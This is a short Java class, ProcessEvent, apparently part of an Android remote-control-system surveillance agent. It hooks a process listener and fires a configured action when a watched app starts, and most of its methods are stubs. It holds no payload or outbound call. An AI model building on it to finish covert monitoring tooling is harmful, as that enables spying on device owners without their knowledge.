package com.ht.RCSAndroidGUI.event;

import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.ListenerProcess;
import com.ht.RCSAndroidGUI.Process;

public class ProcessEvent extends EventBase implements Observer<Process> {
		/** The Constant TAG. */
		private static final String TAG = "ProcessEvent";

		private int actionOnEnter;

		@Override
		public void begin() {
			ListenerProcess.self().attach(this);
		}

		@Override
		public void end() {
			ListenerProcess.self().detach(this);
		}

		@Override
		public boolean parse(EventConf event) {
			super.setEvent(event);

			actionOnEnter = event.getAction();

			return true;
		}

		@Override
		public void go() {
			// TODO Auto-generated method stub
		}

		// Viene richiamata dal listener (dalla dispatch())
		public int notification(Process p) {
			return 0;
		}

		public void onEnter() {
			trigger(actionOnEnter);
		}
}
